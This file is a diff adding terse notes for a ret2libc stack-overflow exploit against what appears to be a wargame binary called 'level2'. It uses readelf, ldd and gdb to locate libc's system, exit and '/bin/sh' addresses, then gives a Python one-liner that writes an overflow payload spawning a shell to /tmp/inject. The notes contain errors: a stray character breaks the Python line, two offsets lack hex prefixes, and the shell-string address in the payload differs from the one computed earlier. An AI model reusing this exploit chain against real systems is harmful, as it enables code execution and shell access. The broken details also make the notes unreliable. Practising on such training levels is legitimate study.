@@ -1,0 +1,12 @@
+readelf -sW ./level2
+ldd ./level2
+gdb -> info proc mapping
+
+readelf -sW /lib/i386-linux-gnu/libc.so.6 | grep exit
+readelf -sW /lib/i386-linux-gnu/libc.so.6 | grep system
+xxd /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+printf '0x%X\n' $((0xb7e2c000 + 0003f060)) //system 0xb7e6b060
+printf '0x%X\n' $((0xb7e2c000 + 00032be0)) //exit 0xB7E5EBE0
+printf '0x%X\n' $((0xb7e2c000 + 0x0160c50 + 0x50)) // /bin/sh 0xb7f8cca4
+
+python -c 'import struct; import sys; sys.stdout.write("a"*76 + "BBBB" + struct.pack("<I", 0x0804853e) +i struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58))' > /tmp/inject
